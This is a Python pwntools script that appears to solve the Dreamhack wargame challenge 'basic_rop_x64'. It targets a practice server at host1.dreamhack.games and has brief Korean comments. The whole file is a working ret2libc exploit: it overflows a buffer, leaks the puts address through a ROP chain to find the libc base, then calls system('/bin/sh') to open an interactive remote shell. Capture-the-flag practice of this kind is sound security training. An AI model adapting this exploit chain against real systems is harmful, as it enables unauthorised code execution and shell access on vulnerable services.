from pwn import *
 
#r=process('./basic_rop_x64')
r=remote("host1.dreamhack.games",18281)
e=ELF('./basic_rop_x64')
libc=ELF('./libc.so.6')
context.log_level='debug'
 
def main():  
    puts_plt=e.plt['puts']
    puts_got=e.got['puts']
 
    gadget1=0x400883 #pop rdi; ret
    gadget2=0x4005a9 #ret
  
    payload=b'a' * (0x48)
    payload += p64(gadget1) + p64(puts_got) + p64(puts_plt)
    payload += p64(e.sym['main'])
 
    r.send(payload)
    r.recvuntil('a'*0x40)
    leak=u64(r.recv(6)+b'\x00\x00')
    print('[+] leak: ' + hex(leak))
    libcbase = leak - libc.sym['puts']
    print('[+] libcbase: ' + hex(libcbase))
 
    system=libcbase+libc.sym['system']     #//libcbase와 system의 오프셋을 더하여 system함수의 실제주소를 구함
    binsh=libcbase+list(libc.search(b'/bin/sh'))[0]  #//libc 안에 있는 /bin/sh의 실제주소를 구함
    payload2 = b'a'*0x48 + p64(gadget1) + p64(binsh) + p64(system)
    r.send(payload2)
    r.interactive()
 
if __name__ == '__main__':
    main()
